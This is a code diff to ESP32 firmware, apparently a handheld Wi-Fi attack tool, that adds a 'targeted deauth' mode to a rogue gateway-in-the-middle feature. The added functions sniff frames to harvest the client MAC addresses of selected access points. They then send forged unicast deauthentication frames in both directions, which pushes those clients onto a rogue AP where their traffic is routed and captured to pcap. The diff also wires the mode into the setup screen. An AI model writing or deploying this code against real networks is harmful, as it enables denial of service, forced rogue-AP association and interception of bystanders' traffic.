@@ -271,9 +271,11 @@ static int           gitm_state         = 0;     // gitm_state_t (see the GITM b
 static char          gitm_ap_ssid[33]  = "";
 static char          gitm_ap_pass[64]  = "";
 static bool          gitm_ap_open      = false;   // true = open AP (no password)
+static int           gitm_deauth_mode  = 0;       // 0=off, 1=broadcast victims, 2=targeted clients
 static lv_obj_t     *gitm_cfg_ssid_ta  = NULL;
 static lv_obj_t     *gitm_cfg_pw_ta    = NULL;
 static lv_obj_t     *gitm_cfg_sec_dd   = NULL;
+static lv_obj_t     *gitm_cfg_deauth_dd = NULL;
 static lv_obj_t     *gitm_cfg_kb       = NULL;
 // Timezone table + time helpers are defined in the DS3231 block far below, but
 // the Time settings UI (above it) needs them — declare them here.
@@ -1799,6 +1801,7 @@ static void reset_function_page_children(void) {
     gitm_cfg_ssid_ta = NULL;
     gitm_cfg_pw_ta = NULL;
     gitm_cfg_sec_dd = NULL;
+    gitm_cfg_deauth_dd = NULL;
     gitm_cfg_kb = NULL;
     // BLE HoneyPair: stop advertising on any nav away (title back button included)
     if (hp_screen_active) {
@@ -14733,6 +14736,132 @@ static void gitm_deauth_stop(void)
     gitm_victim_count = 0;
 }
 
+// ---- Targeted (unicast) client deauth (mode B) -----------------------------
+// Promiscuous-discover the clients of the target AP(s) on our locked channel and
+// unicast-deauth each (dest = client, then dest = AP for the reverse) — never a
+// broadcast, and never our own STA MAC — so it forces roaming without dropping our
+// own uplink. Runs alongside the live gateway (extra radio load; see the note in
+// project memory about promiscuous + NAPT coexistence).
+#define GITM_TD_MAX_CLIENTS 16
+static volatile bool gitm_td_active = false;
+static TaskHandle_t  gitm_td_task_handle = NULL;
+static uint8_t  gitm_td_targets[GITM_MAX_VICTIMS][6];
+static int      gitm_td_target_count = 0;
+static uint8_t  gitm_td_clients[GITM_TD_MAX_CLIENTS][6];
+static uint8_t  gitm_td_client_ap[GITM_TD_MAX_CLIENTS][6];
+static volatile int gitm_td_client_count = 0;
+static portMUX_TYPE gitm_td_mux = portMUX_INITIALIZER_UNLOCKED;
+static uint8_t  gitm_td_own_sta[6], gitm_td_own_ap[6];
+
+static bool gitm_td_is_target(const uint8_t *m) {
+    for (int i = 0; i < gitm_td_target_count; i++)
+        if (memcmp(m, gitm_td_targets[i], 6) == 0) return true;
+    return false;
+}
+static void gitm_td_add_client(const uint8_t *client, const uint8_t *bssid) {
+    if (client[0] & 0x01) return;                              // multicast/broadcast
+    if (memcmp(client, gitm_td_own_sta, 6) == 0) return;       // never ourselves
+    if (memcmp(client, gitm_td_own_ap, 6) == 0) return;
+    portENTER_CRITICAL(&gitm_td_mux);
+    for (int i = 0; i < gitm_td_client_count; i++) {
+        if (memcmp(gitm_td_clients[i], client, 6) == 0) { portEXIT_CRITICAL(&gitm_td_mux); return; }
+    }
+    if (gitm_td_client_count < GITM_TD_MAX_CLIENTS) {
+        memcpy(gitm_td_clients[gitm_td_client_count], client, 6);
+        memcpy(gitm_td_client_ap[gitm_td_client_count], bssid, 6);
+        gitm_td_client_count++;
+    }
+    portEXIT_CRITICAL(&gitm_td_mux);
+}
+// Harvest client MACs seen talking to a target BSSID (data + mgmt frames).
+static void gitm_td_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (!gitm_td_active) return;
+    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
+    const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
+    if (p->rx_ctrl.sig_len < 24) return;
+    const uint8_t *fr = p->payload;
+    uint8_t ftype = (fr[0] >> 2) & 0x3;
+    const uint8_t *a1 = fr + 4, *a2 = fr + 10, *a3 = fr + 16;
+    const uint8_t *bssid = NULL, *client = NULL;
+    if (ftype == 2) {                                          // data
+        bool tods = fr[1] & 0x01, fromds = fr[1] & 0x02;
+        if (tods && !fromds)       { bssid = a1; client = a2; }
+        else if (!tods && fromds)  { bssid = a2; client = a1; }
+        else return;
+    } else if (ftype == 0) {                                   // mgmt: a3=BSSID, a2=SA
+        bssid = a3; client = a2;
+        if (memcmp(client, bssid, 6) == 0) return;             // the AP's own frame
+    } else return;
+    if (!gitm_td_is_target(bssid)) return;
+    gitm_td_add_client(client, bssid);
+}
+// Unicast deauth only (both directions); neither frame is addressed to our STA.
+static void gitm_td_send(const uint8_t *client, const uint8_t *bssid) {
+    uint8_t f[26] = { 0xC0, 0x00, 0x00, 0x00,
+                      0, 0, 0, 0, 0, 0,  0, 0, 0, 0, 0, 0,  0, 0, 0, 0, 0, 0,
+                      0x00, 0x00, 0x07, 0x00 };
+    memcpy(&f[4], client, 6); memcpy(&f[10], bssid, 6); memcpy(&f[16], bssid, 6);   // AP -> client
+    for (int i = 0; i < 3; i++) { esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false); vTaskDelay(pdMS_TO_TICKS(2)); }
+    memcpy(&f[4], bssid, 6);  memcpy(&f[10], client, 6); memcpy(&f[16], bssid, 6);  // client -> AP
+    for (int i = 0; i < 3; i++) { esp_wifi_80211_tx(WIFI_IF_AP, f, sizeof(f), false); vTaskDelay(pdMS_TO_TICKS(2)); }
+}
+static void gitm_td_task(void *arg) {
+    (void)arg;
+    while (gitm_td_active && gitm_active) {
+        int cnt;
+        uint8_t cl[GITM_TD_MAX_CLIENTS][6], ap[GITM_TD_MAX_CLIENTS][6];
+        portENTER_CRITICAL(&gitm_td_mux);
+        cnt = gitm_td_client_count;
+        memcpy(cl, gitm_td_clients, (size_t)cnt * 6);
+        memcpy(ap, gitm_td_client_ap, (size_t)cnt * 6);
+        portEXIT_CRITICAL(&gitm_td_mux);
+        for (int i = 0; i < cnt && gitm_td_active; i++) gitm_td_send(cl[i], ap[i]);
+        vTaskDelay(pdMS_TO_TICKS(cnt ? 500 : 800));
+    }
+    gitm_td_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+static int gitm_td_start(void) {
+    int sel[SCAN_RESULTS_MAX_DISPLAY];
+    int n = wifi_scanner_get_selected(sel, SCAN_RESULTS_MAX_DISPLAY);
+    const wifi_ap_record_t *recs = wifi_scanner_get_results_ptr();
+    const uint16_t *cptr = wifi_scanner_get_count_ptr();
+    uint16_t total = cptr ? *cptr : 0;
+    gitm_td_target_count = 0;
+    if (recs) {
+        for (int i = 0; i < n && gitm_td_target_count < GITM_MAX_VICTIMS; i++) {
+            if (sel[i] < 0 || sel[i] >= (int)total) continue;
+            const wifi_ap_record_t *ap = &recs[sel[i]];
+            if (ap->primary != wifi_connect_channel) continue;   // must be on our locked channel
+            memcpy(gitm_td_targets[gitm_td_target_count++], ap->bssid, 6);
+        }
+    }
+    if (gitm_td_target_count == 0) return 0;
+    esp_wifi_get_mac(WIFI_IF_STA, gitm_td_own_sta);
+    esp_wifi_get_mac(WIFI_IF_AP, gitm_td_own_ap);
+    gitm_td_client_count = 0;
+    gitm_td_active = true;
+    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
+    esp_wifi_set_promiscuous_filter(&filt);
+    esp_wifi_set_promiscuous_rx_cb(gitm_td_cb);
+    esp_wifi_set_promiscuous(true);
+    if (xTaskCreate(gitm_td_task, "gitm_td", 3072, NULL, 5, &gitm_td_task_handle) != pdPASS) {
+        gitm_td_active = false; gitm_td_task_handle = NULL;
+        esp_wifi_set_promiscuous(false);
+        return 0;
+    }
+    return gitm_td_target_count;
+}
+static void gitm_td_stop(void) {
+    if (!gitm_td_active && gitm_td_task_handle == NULL) return;
+    gitm_td_active = false;
+    for (int i = 0; i < 40 && gitm_td_task_handle != NULL; i++) vTaskDelay(pdMS_TO_TICKS(10));
+    if (gitm_td_task_handle) { vTaskDelete(gitm_td_task_handle); gitm_td_task_handle = NULL; }
+    esp_wifi_set_promiscuous(false);
+    gitm_td_client_count = 0;
+    gitm_td_target_count = 0;
+}
+
 // Install the pcap tap on the AP netif and start the writer (mirrors mitm start).
 static bool gitm_capture_start(esp_netif_t *ap_netif)
 {
@@ -14815,6 +14944,7 @@ static void gitm_stop(void)
     if (!gitm_active) return;
     gitm_active = false;
     gitm_deauth_stop();
+    gitm_td_stop();
     if (gitm_timer) { lv_timer_del(gitm_timer); gitm_timer = NULL; }
     gitm_capture_stop();
     capture_gateway_stop();
@@ -15003,17 +15133,18 @@ static void gitm_cfg_start_cb(lv_event_t *e)
         if (gitm_cfg_pw_ta) lv_textarea_set_placeholder_text(gitm_cfg_pw_ta, "WPA2 needs 8-63 chars");
         return;
     }
+    gitm_deauth_mode = gitm_cfg_deauth_dd ? (int)lv_dropdown_get_selected(gitm_cfg_deauth_dd) : 0;
     strncpy(gitm_ap_ssid, ssid, sizeof(gitm_ap_ssid) - 1); gitm_ap_ssid[sizeof(gitm_ap_ssid) - 1] = '\0';
     strncpy(gitm_ap_pass, pw, sizeof(gitm_ap_pass) - 1);   gitm_ap_pass[sizeof(gitm_ap_pass) - 1] = '\0';
     gitm_ap_open = open;
-    gitm_cfg_ssid_ta = gitm_cfg_pw_ta = gitm_cfg_sec_dd = gitm_cfg_kb = NULL;
+    gitm_cfg_ssid_ta = gitm_cfg_pw_ta = gitm_cfg_sec_dd = gitm_cfg_deauth_dd = gitm_cfg_kb = NULL;
     show_gitm_page();
 }
 
 static void show_gitm_config_page(void)
 {
     create_function_page_base("Rogue GITM Setup");
-    gitm_cfg_ssid_ta = gitm_cfg_pw_ta = gitm_cfg_sec_dd = gitm_cfg_kb = NULL;
+    gitm_cfg_ssid_ta = gitm_cfg_pw_ta = gitm_cfg_sec_dd = gitm_cfg_deauth_dd = gitm_cfg_kb = NULL;
 
     lv_obj_t *info = lv_label_create(function_page);
     lv_label_set_long_mode(info, LV_LABEL_LONG_WRAP);
@@ -15028,26 +15159,26 @@ static void show_gitm_config_page(void)
     lv_label_set_text(ssid_lbl, "AP name (SSID):");
     lv_obj_set_style_text_font(ssid_lbl, &lv_font_montserrat_14, 0);
     lv_obj_set_style_text_color(ssid_lbl, ui_text_color(), 0);
-    lv_obj_align(ssid_lbl, LV_ALIGN_TOP_LEFT, 16, 78);
+    lv_obj_align(ssid_lbl, LV_ALIGN_TOP_LEFT, 16, 70);
 
     gitm_cfg_ssid_ta = lv_textarea_create(function_page);
     lv_textarea_set_one_line(gitm_cfg_ssid_ta, true);
     lv_textarea_set_text(gitm_cfg_ssid_ta, wifi_connect_ssid);   // default = uplink SSID
     lv_obj_set_width(gitm_cfg_ssid_ta, lv_pct(92));
-    lv_obj_align(gitm_cfg_ssid_ta, LV_ALIGN_TOP_MID, 0, 98);
+    lv_obj_align(gitm_cfg_ssid_ta, LV_ALIGN_TOP_MID, 0, 88);
     lv_obj_add_event_cb(gitm_cfg_ssid_ta, gitm_cfg_ta_event_cb, LV_EVENT_CLICKED, NULL);
 
     lv_obj_t *sec_lbl = lv_label_create(function_page);
     lv_label_set_text(sec_lbl, "Security:");
     lv_obj_set_style_text_font(sec_lbl, &lv_font_montserrat_14, 0);
     lv_obj_set_style_text_color(sec_lbl, ui_text_color(), 0);
-    lv_obj_align(sec_lbl, LV_ALIGN_TOP_LEFT, 16, 146);
+    lv_obj_align(sec_lbl, LV_ALIGN_TOP_LEFT, 16, 130);
 
     gitm_cfg_sec_dd = lv_dropdown_create(function_page);
     lv_dropdown_set_options(gitm_cfg_sec_dd, "WPA2\nOpen");
     lv_dropdown_set_selected(gitm_cfg_sec_dd, wifi_connect_password[0] ? 0 : 1);
     lv_obj_set_width(gitm_cfg_sec_dd, 140);
-    lv_obj_align(gitm_cfg_sec_dd, LV_ALIGN_TOP_LEFT, 110, 142);
+    lv_obj_align(gitm_cfg_sec_dd, LV_ALIGN_TOP_LEFT, 110, 126);
     lv_obj_add_event_cb(gitm_cfg_sec_dd, gitm_cfg_sec_cb, LV_EVENT_VALUE_CHANGED, NULL);
 
     gitm_cfg_pw_ta = lv_textarea_create(function_page);
@@ -15056,13 +15187,27 @@ static void show_gitm_config_page(void)
     lv_textarea_set_placeholder_text(gitm_cfg_pw_ta, "WPA2 password (8-63)");
     lv_textarea_set_text(gitm_cfg_pw_ta, wifi_connect_password);   // default = uplink password
     lv_obj_set_width(gitm_cfg_pw_ta, lv_pct(92));
-    lv_obj_align(gitm_cfg_pw_ta, LV_ALIGN_TOP_MID, 0, 182);
+    lv_obj_align(gitm_cfg_pw_ta, LV_ALIGN_TOP_MID, 0, 162);
     lv_obj_add_event_cb(gitm_cfg_pw_ta, gitm_cfg_ta_event_cb, LV_EVENT_CLICKED, NULL);
     if (!wifi_connect_password[0]) lv_obj_add_flag(gitm_cfg_pw_ta, LV_OBJ_FLAG_HIDDEN);
 
+    // Deauth mode: Off / Broadcast a separately-selected victim / Targeted unicast
+    // of the target AP(s)' clients (forces roam even same-network).
+    lv_obj_t *da_lbl = lv_label_create(function_page);
+    lv_label_set_text(da_lbl, "Deauth:");
+    lv_obj_set_style_text_font(da_lbl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(da_lbl, ui_text_color(), 0);
+    lv_obj_align(da_lbl, LV_ALIGN_TOP_LEFT, 16, 200);
+
+    gitm_cfg_deauth_dd = lv_dropdown_create(function_page);
+    lv_dropdown_set_options(gitm_cfg_deauth_dd, "Off\nBroadcast victim\nTargeted clients");
+    lv_dropdown_set_selected(gitm_cfg_deauth_dd, 0);
+    lv_obj_set_width(gitm_cfg_deauth_dd, 200);
+    lv_obj_align(gitm_cfg_deauth_dd, LV_ALIGN_TOP_LEFT, 110, 196);
+
     lv_obj_t *start = lv_btn_create(function_page);
-    lv_obj_set_size(start, 160, 44);
-    lv_obj_align(start, LV_ALIGN_TOP_MID, 0, 228);
+    lv_obj_set_size(start, 160, 42);
+    lv_obj_align(start, LV_ALIGN_TOP_MID, 0, 240);
     lv_obj_set_style_bg_color(start, COLOR_MATERIAL_GREEN, 0);
     lv_obj_set_style_radius(start, 8, 0);
     lv_obj_set_style_border_width(start, 0, 0);
@@ -15251,14 +15396,29 @@ static void show_gitm_page(void)
     gitm_capture_start(ap_netif);   // pcap tap on the AP netif; cap_label filled by the timer
 
     gitm_active = true;
-    int victims = gitm_deauth_start();
-    if (victims > 0)
-        lv_label_set_text_fmt(gitm_status_label,
-            "Rogue overlay: deauthing %d AP(s) on ch %u - matching-SSID clients roam onto us.",
-            victims, wifi_connect_channel);
-    else
+    int victims = 0;
+    if (gitm_deauth_mode == 1) {          // broadcast the selected victim APs (uplink excluded)
+        victims = gitm_deauth_start();
+        if (victims > 0)
+            lv_label_set_text_fmt(gitm_status_label,
+                "Broadcast deauth: %d victim AP(s) on ch %u - matching-SSID clients roam onto us.",
+                victims, wifi_connect_channel);
+        else
+            lv_label_set_text(gitm_status_label,
+                "No separate same-channel victim selected; gateway live (no deauth).");
+    } else if (gitm_deauth_mode == 2) {   // targeted unicast of the target APs' clients
+        victims = gitm_td_start();
+        if (victims > 0)
+            lv_label_set_text_fmt(gitm_status_label,
+                "Targeted deauth: sniffing + unicast-kicking clients of %d AP(s) on ch %u.",
+                victims, wifi_connect_channel);
+        else
+            lv_label_set_text(gitm_status_label,
+                "No same-channel target for targeted deauth; gateway live (no deauth).");
+    } else {
         lv_label_set_text(gitm_status_label,
             "Gateway live. Clients that join the AP are routed (NAPT) + recorded.");
+    }
     lv_obj_set_style_text_color(gitm_status_label, lv_color_make(150, 150, 150), 0);
     gitm_set_state(GITM_ST_RUNNING);
 
